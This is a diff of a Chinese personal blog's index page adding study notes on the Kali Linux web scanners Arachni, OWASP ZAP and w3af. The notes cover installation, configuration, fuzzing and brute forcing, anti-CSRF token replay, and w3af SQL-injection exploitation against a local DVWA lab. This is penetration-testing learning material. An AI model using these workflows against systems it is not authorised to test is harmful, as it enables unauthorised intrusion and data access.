+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/29/Kali%20linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%B8%80)%EF%BC%9AArachni/" itemprop="url">Kali Linux笔记(四十一)：Arachni</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-29T10:51:56+08:00">
+                2019-12-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  473 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-Arachni-▲-2019-12-29-软件扫描出问题"><a href="#1-Arachni-▲-2019-12-29-软件扫描出问题" class="headerlink" title="1. Arachni  ▲ 2019.12.29 软件扫描出问题"></a>1. Arachni  ▲ 2019.12.29 软件扫描出问题</h4><ul>
+<li>Kali 自带了旧的arachni阉割版</li>
+<li>安装<ul>
+<li><a href="http://www.arachni-scanner.com/download/#Linux" target="_blank" rel="noopener">http://www.arachni-scanner.com/download/#Linux</a></li>
+<li><strong><code>🔺命令：tar xvf arachni.tar.gz</code></strong></li>
+<li><a href="http://localhost:9292/" target="_blank" rel="noopener">http://localhost:9292/</a> （<a href="mailto:admin@admin.admin" target="_blank" rel="noopener">admin@admin.admin</a>/administrator）</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-Arachni"><a href="#2-Arachni" class="headerlink" title="2. Arachni"></a>2. Arachni</h4><ul>
+<li>Profile<ul>
+<li>Import</li>
+<li>Export</li>
+<li>New</li>
+</ul>
+</li>
+<li>Dispatcher<ul>
+<li><strong><code>🔺命令：./arachni_rpcd --address=127.0.0.1 --port=1111 --nickname=test1</code></strong></li>
+</ul>
+</li>
+<li>Grid<ul>
+<li><strong><code>🔺命令：./arachni_rpcd --nickname=test2 --address=127.0.0.1 --neighbour=127.0.0.1:1111</code></strong></li>
+</ul>
+</li>
+<li>Scan</li>
+</ul>
+<h4 id="3-Arachni-→-Scan"><a href="#3-Arachni-→-Scan" class="headerlink" title="3. Arachni → Scan"></a>3. Arachni → Scan</h4><ul>
+<li>new scan<ul>
+<li>IP地址、配置文件、描述、共享</li>
+<li>Advanced options（Distribution/Scheduling）</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>▲ 一般的扫描器，要么是直连，要么是通过代理扫描，Arachni不一样，进行分布式扫描，进行负载均衡，每次扫描会生成多个Dispatcher，作为Remote，同一时间不同dispatcher可以扫描不同站点
+Direct：直接对目标主机进行扫描
+Remote：只有一个Dispatcher
+Grid：分布式，多个Dispatcher，网格类型</code></pre></blockquote>
+<h4 id="4-Arachni-→-Users"><a href="#4-Arachni-→-Users" class="headerlink" title="4. Arachni → Users"></a>4. Arachni → Users</h4><ul>
+<li>集成两个账号（Regular user/Administrator）</li>
+<li>可以新建一个新的账号</li>
+</ul>
+<h4 id="5-Arachni-→-Dispatched"><a href="#5-Arachni-→-Dispatched" class="headerlink" title="5. Arachni → Dispatched"></a>5. Arachni → Dispatched</h4><ul>
+<li>控制台创建一个新的Dispatched（<strong><code>🔺命令：./arachni_rpcd --address=127.0.0.1 --port=1111 --nickname=test1</code></strong>）</li>
+<li>Web界面链接一个存在的Dispatched</li>
+</ul>
+<blockquote>
+<pre><code>▲ Dispatched可以工作在远端服务器，也可以工作在本地服务器上</code></pre></blockquote>
+<h4 id="6-Arachni-→-Scan"><a href="#6-Arachni-→-Scan" class="headerlink" title="6. Arachni → Scan"></a>6. Arachni → Scan</h4><ul>
+<li>通过Web界面链接一个Dispatched</li>
+<li>定义一个Scan，可以选择Remote/Guid</li>
+<li>在控制台对一个Dispatched加入一个新的Dispatched（<strong><code>🔺命令：./arachni_rpcd --nickname=test2 --address=127.0.0.1 --neighbour=127.0.0.1:1111</code></strong>）</li>
+</ul>
+<blockquote>
+<pre><code>▲ ?-s：大部分情况下，可以通过这一个命令，查看PHP源代码
+▲ 在指定加入组的Dispatched时，可以采用链式的形式，不要同时指向同一个Dipatched</code></pre></blockquote>
+<h4 id="7-Arachni-→-Profile"><a href="#7-Arachni-→-Profile" class="headerlink" title="7. Arachni → Profile"></a>7. Arachni → Profile</h4><ul>
+<li>Profiles Name<ul>
+<li>SQL injection</li>
+<li>Cross-Site Scripting（XSS）</li>
+<li>Default</li>
+</ul>
+</li>
+<li>Import</li>
+<li>New Profiles<ul>
+<li>Scope（扫描范围）</li>
+<li>Audit（扫描项目）</li>
+<li>Input（提交数据选项）（预设输入，建议修改，审计日志很容易发现）</li>
+<li>HTTP（HTTP选项）</li>
+<li>Platform fingerprinting（平台系统选择）</li>
+<li>Ckecks（扫描功能，主动模块和被动模块）</li>
+<li>Plugins（插件，发出提示等）（WAF_Detector）</li>
+<li>Session check（判断是否登陆成功）</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/29/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%8C)%EF%BC%9AOWASP_ZAP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/29/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81%E4%BA%8C)%EF%BC%9AOWASP_ZAP/" itemprop="url">Kali Linux笔记(四十二)：OWASP_ZAP</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-29T10:51:56+08:00">
+                2019-12-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  715 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-OWASP-ZAP"><a href="#1-OWASP-ZAP" class="headerlink" title="1. OWASP_ZAP"></a>1. OWASP_ZAP</h4><ul>
+<li>Zed attack proxy</li>
+<li>WEB Application集成渗透测试和漏洞挖掘工具</li>
+<li>开源免费跨平台简单易用</li>
+<li>截断代理（自动配置端口）</li>
+<li>主动（Quick Start/站点目录 → 攻击 → Active Scan）</li>
+<li>被动扫描（手动爬网，截断代理）</li>
+<li>Fuzzy（工具 → Fuzz/Request → 选择 → 右键 → Fuzz）▲ 注意File Fuzzers</li>
+<li>暴力破解（站点目录 → Request → 选择 → 右键 → Fuzz → Payload(字典文件)）</li>
+<li>API（必须使用了OWASP_ZAP代理的情况下）<ul>
+<li><a href="http://zap/" target="_blank" rel="noopener">http://zap/</a></li>
+</ul>
+</li>
+</ul>
+<h4 id="2-OWASP-ZAP"><a href="#2-OWASP-ZAP" class="headerlink" title="2. OWASP_ZAP"></a>2. OWASP_ZAP</h4><ul>
+<li>Persist Session</li>
+<li>Mode<ul>
+<li>Safe（安全扫描，不包含危险扫描）</li>
+<li>Protected（指定Web Application进行危险扫描）</li>
+<li>Standard（标准扫描，存在一些危险扫描，可能造成破坏）</li>
+<li>ATTACK（能扫就扫，能有多强烈就多强烈）</li>
+</ul>
+</li>
+<li>升级Add-ones</li>
+<li>Anti CSRF Tokens（每次访问，随机生成一个Token → 防止CSRF/重放攻击）</li>
+</ul>
+<blockquote>
+<pre><code>▲ 一般情况下，虽然Tokens是变化的，但Tokens的头部是一般是固定不变的，可以添加到OWASP_ZAP中，可以做到重放攻击
+设置Options → Anti CSRF Tokens → Add（Tokens的名字）</code></pre></blockquote>
+<ul>
+<li>https–CA（增加OWASP_ZAP自签名证书）</li>
+</ul>
+<blockquote>
+<pre><code>▲ 设置Options → Dynamic SSL Certificates → 保存（cet证书） → 安装证书</code></pre></blockquote>
+<ul>
+<li>Scope/Cpntexts/Filter</li>
+<li>Http Sessions–default session tokens &amp; site session tokes</li>
+<li>Note/tag</li>
+<li>Passive Scan</li>
+</ul>
+<h4 id="3-OWASP-ZAP-Session"><a href="#3-OWASP-ZAP-Session" class="headerlink" title="3. OWASP_ZAP Session"></a>3. OWASP_ZAP Session</h4><ul>
+<li>persist the ZAP Session（文件 → 打开会话）<ul>
+<li>current timestamp（保存默认的ZAP目录）</li>
+<li>specify the name and location（长久保存自定义目录）</li>
+<li>not persist the ZAP Session（不长久保存）</li>
+</ul>
+</li>
+<li>Request/Response</li>
+<li>手动爬网 → OWASP_ZAP分析 </li>
+</ul>
+<h4 id="4-OWASP-ZAP-Manage-Add-ones"><a href="#4-OWASP-ZAP-Manage-Add-ones" class="headerlink" title="4. OWASP_ZAP Manage Add-ones"></a>4. OWASP_ZAP Manage Add-ones</h4><ul>
+<li>Installed（版本更新可能需要到Github）<ul>
+<li>Uninstall Selected</li>
+<li>Update Selected</li>
+</ul>
+</li>
+<li>Marketplace<ul>
+<li>Release（长期使用，正式发布）</li>
+<li>Beta（测试使用，较正式发布）</li>
+<li>Alpha（不是成熟的版本，稳定性准备性不是很高）</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-OWASP-ZAP-policy"><a href="#5-OWASP-ZAP-policy" class="headerlink" title="5. OWASP_ZAP policy"></a>5. OWASP_ZAP policy</h4><ul>
+<li>General<ul>
+<li>添加策略</li>
+<li>Name</li>
+<li>Default Alert Threshold（报警阈值，一般选中等）</li>
+<li>Default Attack Strength（攻击强度）</li>
+</ul>
+</li>
+<li>信息收集</li>
+<li>客户端浏览器</li>
+<li>服务器安全</li>
+<li>杂项</li>
+<li>注入</li>
+</ul>
+<h4 id="6-OWASP-ZAP-Scope-Cpntexts-Filter（范围-上下文-筛选）"><a href="#6-OWASP-ZAP-Scope-Cpntexts-Filter（范围-上下文-筛选）" class="headerlink" title="6. OWASP_ZAP Scope/Cpntexts/Filter（范围/上下文/筛选）"></a>6. OWASP_ZAP Scope/Cpntexts/Filter（范围/上下文/筛选）</h4><ul>
+<li>站点目录 → Include in Context → New context</li>
+<li>Scope包含Context，可以删除一个Context</li>
+<li>同一个范围Scope同一个策略</li>
+</ul>
+<h4 id="7-OWASP-ZAP-Http-Session"><a href="#7-OWASP-ZAP-Http-Session" class="headerlink" title="7. OWASP_ZAP Http Session"></a>7. OWASP_ZAP Http Session</h4><ul>
+<li>工具栏 → Session Properties<ul>
+<li>针对不同Context有不同的Authentication</li>
+<li>默认Manual Authentication（记录访问过网站的Session，手动输入记录）</li>
+<li>支持表单、HTTP Basic、Sript-Base</li>
+</ul>
+</li>
+<li>站点 → 加号 → 新建脚本</li>
+<li>选项 → Http Session → 增加Web Application自定义的Session </li>
+</ul>
+<h4 id="8-OWASP-ZAP-编码解码哈希"><a href="#8-OWASP-ZAP-编码解码哈希" class="headerlink" title="8. OWASP_ZAP 编码解码哈希"></a>8. OWASP_ZAP 编码解码哈希</h4><ul>
+<li>选择编码的字段或要编码的字段 → 右键选择</li>
+</ul>
+<blockquote>
+<pre><code>SHA1 -- 彩虹表，统计哈希值对应的值</code></pre></blockquote>
+<h4 id="9-OWASP-ZAP-截断"><a href="#9-OWASP-ZAP-截断" class="headerlink" title="9. OWASP_ZAP 截断"></a>9. OWASP_ZAP 截断</h4><ul>
+<li>工具栏 → Set break on all requests and responses</li>
+<li>单步截断/一次截断</li>
+<li>▲ 显示隐藏域（小灯泡）– 代理服务器修改返回的内容后返回给浏览器</li>
+</ul>
+<h4 id="10-OWASP-ZAP"><a href="#10-OWASP-ZAP" class="headerlink" title="10. OWASP_ZAP"></a>10. OWASP_ZAP</h4><ul>
+<li>标准扫描工作流程<ul>
+<li>设置代理</li>
+<li>手动爬网</li>
+<li>自动爬网（OWASP_ZAP自动爬网，站点目录 → 右键攻击 → 爬网/Forced Browser site/Forced Browser directory/Forced Browser directory(and children)）</li>
+<li>主动扫描（OWASP_ZAP自动爬网，站点目录 → 右键攻击 → Active Scan）</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81)%EF%BC%9AW3AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%9B%9B%E5%8D%81)%EF%BC%9AW3AF/" itemprop="url">Kali Linux笔记(四十)：W3AF</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-27T10:59:16+08:00">
+                2019-12-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.3k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-w3af"><a href="#1-w3af" class="headerlink" title="1. w3af"></a>1. w3af</h4><blockquote>
+<pre><code>▲ 2019.12.26 Kali未带此软件，通过github下载安装过于复杂，还未成功</code></pre></blockquote>
+<ul>
+<li>Web Application Attack and Audit Framework，基于python语言开发</li>
+<li>此框架的目标是帮助你发现和利用所有WEB应用程序漏洞（和msf框架结合）</li>
+<li>9大类近150个plugin<ul>
+<li><strong>audit</strong>（审计，扫描发现漏洞）</li>
+<li>infrastructure（基础架构，扫描操作系统，Web Server，是否使用waf）</li>
+<li>grep（被动扫描插件类型，根据audit扫描发回的信息进行信息搜索）</li>
+<li>evasion（逃避目标IDS，IBS，WAF的检测）</li>
+<li>mangle（做一些基于正则表达式的计算）</li>
+<li>auth（身份认证）</li>
+<li>bruteforce（暴力破解，fuzz隐藏路径或文件名）</li>
+<li>output（扫描结果output为一种可被其他工具调用的文件）</li>
+<li><strong>crawl</strong>（爬网，通过超链接）</li>
+<li>attack（唯一不可以进行人工修改，已经固定）</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-w3af"><a href="#2-w3af" class="headerlink" title="2. w3af"></a>2. w3af</h4><ul>
+<li>安装（Kali自带版本执行扫描时挂死）<ul>
+<li>cd ~</li>
+<li>apt-get update</li>
+<li>apt-get install -y python-pip w3af</li>
+<li>pip install –upgrade pip</li>
+<li>git clone <a href="https://github.com/andresriancho/w3af.git" target="_blank" rel="noopener">https://github.com/andresriancho/w3af.git</a></li>
+<li>cd w3af</li>
+<li>./w3af_console（./w3af_gui）</li>
+<li>apt-get build-dep python-lxml</li>
+<li>./tmp/w3af_dependency_install.sh</li>
+</ul>
+</li>
+<li>升级<ul>
+<li>git pull</li>
+</ul>
+</li>
+<li>创建快捷方式<ul>
+<li>cp /usr/share/application/w3af.desktop /root/Desktop</li>
+<li>gedit w3af.desktop（修改Exec路径）</li>
+<li>chmod +x w3af</li>
+</ul>
+</li>
+<li>用户接口<ul>
+<li>Console</li>
+<li>Gui</li>
+<li>API</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-w3af-console"><a href="#3-w3af-console" class="headerlink" title="3. w3af_console"></a>3. w3af_console</h4><ul>
+<li>help（显示可用指令）</li>
+<li>plugin（进入plugin子命令）<ul>
+<li>Help（显示可用指令）</li>
+<li>list audit（列出audit类所有的插件）</li>
+<li>audit sqli xss（选择使用的audit类所有的插件）</li>
+<li>grep all</li>
+<li>crawl web_spider</li>
+<li>back</li>
+</ul>
+</li>
+<li>profile（对扫描目标的集成选项）<ul>
+<li>list</li>
+<li>save as self-contained（保存当前配置）</li>
+<li>save as test self-contained</li>
+<li>use（调用）</li>
+</ul>
+</li>
+<li>http-settings（全局性）<ul>
+<li>help</li>
+<li>view（可查看http-settings的设置）</li>
+<li>set（设置）</li>
+<li>save（保存）</li>
+</ul>
+</li>
+<li>misc-settings（全局性）</li>
+<li>target<ul>
+<li>help</li>
+<li>view</li>
+<li>set taget</li>
+</ul>
+</li>
+<li>start</li>
+<li>script<ul>
+<li>script/* .w3af</li>
+</ul>
+</li>
+<li>./w3af_console -s script/sqli.w3af</li>
+</ul>
+<h4 id="4-w3af–身份认证"><a href="#4-w3af–身份认证" class="headerlink" title="4. w3af–身份认证"></a>4. w3af–身份认证</h4><ul>
+<li>HTTP Basic</li>
+<li>NTLM</li>
+<li>Form</li>
+<li>Cookie（双因素身份认证/anti-CSRF tokens U盘令牌格式）</li>
+</ul>
+<blockquote>
+<pre><code>▲ 安装IIS：运行 → appwiz.cpl → 添加/删除组件 → 应用程序服务器 → IIS
+▲ 设置IIS：开始 → 管理工具 → Internet信息服务（IIS）管理器 → 网站 → 默认网站 → 右键 → 属性 → 目录安全性 → 身份验证和访问控制 → 去掉匿名身份认证</code></pre></blockquote>
+<h4 id="5-w3af–基本身份认证"><a href="#5-w3af–基本身份认证" class="headerlink" title="5. w3af–基本身份认证"></a>5. w3af–基本身份认证</h4><ul>
+<li>设置HTTP Basic，设置账号密码</li>
+<li>配置Configuration</li>
+<li>设置Plugin</li>
+<li>可通过抓包，follow TCP流，解码Base64得出用户名密码</li>
+</ul>
+<h4 id="6-w3af–NTLM身份认证"><a href="#6-w3af–NTLM身份认证" class="headerlink" title="6. w3af–NTLM身份认证"></a>6. w3af–NTLM身份认证</h4><ul>
+<li>集成Windows身份认证</li>
+<li>配置Configuration</li>
+<li>设置Plugin</li>
+<li>抓包可看到加密的NTLM信息</li>
+</ul>
+<h4 id="7-w3af–Form身份认证"><a href="#7-w3af–Form身份认证" class="headerlink" title="7. w3af–Form身份认证"></a>7. w3af–Form身份认证</h4><ul>
+<li>不能配置Configuration</li>
+<li>设置Plugin → Auth（detalied/generic）<ul>
+<li>check-string（登陆成功的字符串）</li>
+<li>data_format（数据源代码，格式）</li>
+</ul>
+</li>
+<li>设置Plugin → crawl → Web_spider → only_forward（限定扫描子目录）</li>
+<li>设置Plugin</li>
+</ul>
+<h4 id="8-w3af–Cookie身份认证（绕过令牌ID认证的方式）"><a href="#8-w3af–Cookie身份认证（绕过令牌ID认证的方式）" class="headerlink" title="8. w3af–Cookie身份认证（绕过令牌ID认证的方式）"></a>8. w3af–Cookie身份认证（绕过令牌ID认证的方式）</h4><ul>
+<li>找到网站的Cookie</li>
+<li>w3af只接受严格Cookie格式的文件</li>
+<li>配置Configuration（严格Cookie格式，需要添加时间，最后加00，用TAB键跳转）</li>
+<li>设置Plugin</li>
+</ul>
+<blockquote>
+<pre><code>Cookie文件
+.netscape.com    TRUE    /   FALSE   946684799   NETSCAPE_ID 100103
+Each line represents a single piece of stored information.A tab is inserted between each of the fields
+
+From left-to-right,here is what each field represents:
+domain--The domain that created AND that can read the variable.
+flag--A TRUE/FALSE value indicating if all machines within a given domain can access the variable.This value is set automatically by the browser,depending on the value you set for domain
+Path--The path within the domain that the variable is valid for.
+Secure--A TRUE/FALSE value indicating if a secure connection with the domain is needed to access the variable
+Expiration--The UNIX time that variable will expire on.UNIX time is  as the number of seconds since Jan 1,1970 00:00:00 GMT
+Name--The name of the variable
+Value--The values of the variable</code></pre></blockquote>
+<h4 id="9-w3af–身份认证（截断代理）"><a href="#9-w3af–身份认证（截断代理）" class="headerlink" title="9. w3af–身份认证（截断代理）"></a>9. w3af–身份认证（截断代理）</h4><ul>
+<li>截断代理（▲ 手动Web漏洞挖掘最基础步骤，提交数据代码）</li>
+<li>HTTP header file（另类的身份认证方法）</li>
+<li>保存头文件中不变的变量为一个txt文件，用于Configuration</li>
+<li>Configuration → General → headers_file</li>
+<li>Proxies the HTTP requests,allowing their modification → History → Send Request to Manual Editor（自编辑）</li>
+<li>Proxies the HTTP requests,allowing their modification →History → Fuzzy Request（正则表达式表达）<ul>
+<li>$10$（数字）</li>
+<li>$string.lowercas[:26]$（字母）</li>
+<li>$[‘spam’,’eggss’]$（查找特定字符串）</li>
+<li>$[l.strip() for l in file (‘input.txt’).readline()]$</li>
+</ul>
+</li>
+<li>Proxies the HTTP requests,allowing their modification →History → Compare（比较请求的结果）</li>
+<li>Proxies the HTTP requests,allowing their modification →History → Export Request（导出）</li>
+<li>Proxies the HTTP requests,allowing their modification →History → History → Audit Request with…（调整修改请求内容）</li>
+<li>Cluster responses（ID视图查看）</li>
+</ul>
+<blockquote>
+<pre><code>大部分不变的头部请求：
+Accept-language: en-US,en;q=0.5
+Accept-encoding: gzip,deflate
+Connection: keep-alive
+Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User Agent: MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12(GUI) MMP/2.0 UP.Link/6.3.1.13.0
+Host: 192.168.20.7
+Referer: http://192.168.20.7/dvwa/vulnerabilities/sqli/
+Cookie: Security=low; PHPSESSID=f8c40e5267bfbb04a6053e9ec8e6293
+Content-type: application/x-www-form-urlencoded
+
+▲ skipfish的fuzz.txt:/usr/share/wfuzz/wordlist/fuzzdb/Discovery/FilenameBruteforce/wordlistSkipfish.fuzz.txt</code></pre></blockquote>
+<h4 id="10-w3af–截断代理技术"><a href="#10-w3af–截断代理技术" class="headerlink" title="10. w3af–截断代理技术"></a>10. w3af–截断代理技术</h4><ul>
+<li>w3af不支持客户端技术（Javascript，Flash，Java applet等）</li>
+<li>截断代理手动爬网（Proxy）<ul>
+<li>crawl → spider_man（Plugin）</li>
+<li>output → export_requests（Output插件）（~/output.b64 64编码）</li>
+<li><a href="http://127.7.7.7/spider_man?terminate（终止spider_man）" target="_blank" rel="noopener">http://127.7.7.7/spider_man?terminate（终止spider_man）</a></li>
+</ul>
+</li>
+<li>crawl → import_results（base64）</li>
+</ul>
+<h4 id="11-w3af–exploit"><a href="#11-w3af–exploit" class="headerlink" title="11. w3af–exploit"></a>11. w3af–exploit</h4><ul>
+<li>Proxies the HTTP requests,allowing their modification（抓取有SQL I njection路径）</li>
+<li>Configuration → General → headers_file（指定头文件）</li>
+<li>Target（设置Plugin → sqli）</li>
+<li>Start</li>
+<li>Results → Request/Response navigator（查看是否有SQL 语法报错）</li>
+<li>Exploit → Linux命令<ul>
+<li>payload（用法：payload users）</li>
+<li>users</li>
+<li>dbs</li>
+</ul>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/27/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%BA%94)%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1400,1744 +3138,6 @@ vega比较集中关注Web Application方面的漏洞，比较少关注软件，W
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/24/%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%81%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/12/24/%E7%AC%AC%E4%B8%89%E7%AB%A0%E3%80%81%E9%A1%B5%E9%9D%A2%E7%BD%AE%E6%8D%A2%E7%AE%97%E6%B3%95/" itemprop="url">第三章、页面置换算法</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-24T16:36:19+08:00">
-                2019-12-24
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
